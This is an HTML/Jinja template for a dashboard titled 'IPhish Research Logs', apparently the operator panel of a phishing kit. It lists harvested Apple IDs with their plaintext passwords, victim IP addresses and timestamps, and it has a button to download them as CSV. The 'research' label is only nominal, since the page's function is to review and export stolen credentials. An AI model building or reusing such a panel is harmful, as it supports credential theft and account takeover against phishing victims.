<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IPhish | Research Console</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #121212; color: #e0e0e0; padding: 40px; }
        .container { max-width: 1000px; margin: auto; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px; margin-bottom: 20px; }
        .btn-export { background: #007aff; color: white; text-decoration: none; padding: 10px 20px; border-radius: 5px; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; background: #1e1e1e; border-radius: 8px; overflow: hidden; }
        th, td { padding: 15px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #252525; color: #007aff; text-transform: uppercase; font-size: 12px; }
        tr:hover { background: #2a2a2a; }
        .ip-badge { background: #444; padding: 4px 8px; border-radius: 4px; font-family: monospace; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üõ°Ô∏è IPhish Research Logs</h1>
            <a href="/export" class="btn-export">üì• Download CSV</a>
        </div>
        <table>
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Apple ID</th>
                    <th>Password</th>
                    <th>IP Address</th>
                </tr>
            </thead>
            <tbody>
                {% for log in logs %}
                <tr>
                    <td>{{ log.time }}</td>
                    <td><strong>{{ log.user }}</strong></td>
                    <td><code>{{ log.pwd }}</code></td>
                    <td><span class="ip-badge">{{ log.ip }}</span></td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
</body>
</html>
